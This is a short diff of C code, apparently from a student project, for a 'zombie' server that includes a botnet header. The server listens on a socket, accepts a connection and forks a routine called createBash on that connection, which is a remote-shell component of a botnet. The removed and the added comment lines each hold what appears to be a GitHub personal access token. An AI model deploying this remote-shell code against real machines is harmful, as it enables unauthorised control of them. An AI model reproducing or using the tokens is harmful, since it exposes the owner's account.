@@ -14,10 +14,11 @@
 #include <sys/sem.h>
 #include <sys/shm.h>
 #include <sys/socket.h>
-//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
+//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
 #include "utils_v2.h"
 #include "port.h"
-#include "zombie.h"
+#include "botNet.h"
+
 int getFreePort(int sockfd);
 int isPortFreeAndValid(int sockfd,int port);
 
@@ -33,7 +34,7 @@ Zombie initSocketServer(bool withPort, int portReceived){
 	
 	slisten(sockfd, BACKLOG);
 	Zombie zombie= {
-		"zombie.c", "127.0.0.1", port, sockfd,getpid() 
+		"zombiO.c", "127.0.0.1", port, sockfd,getpid() 
 	};
 	return zombie;
 }
@@ -64,7 +65,7 @@ int main(int argc, char const *argv[]){
 	printf("Le serveur tourne sur le port : %i  grace à souli\n", zombie.port);	
 	int newsockfd = saccept(zombie.sockFd);
 	swrite(newsockfd, &zombie, sizeof(Zombie));
-
+	printf("i wrote\n");
 	fork_and_run1(createBash,&newsockfd);
 	while(1){
 		sleep(10);
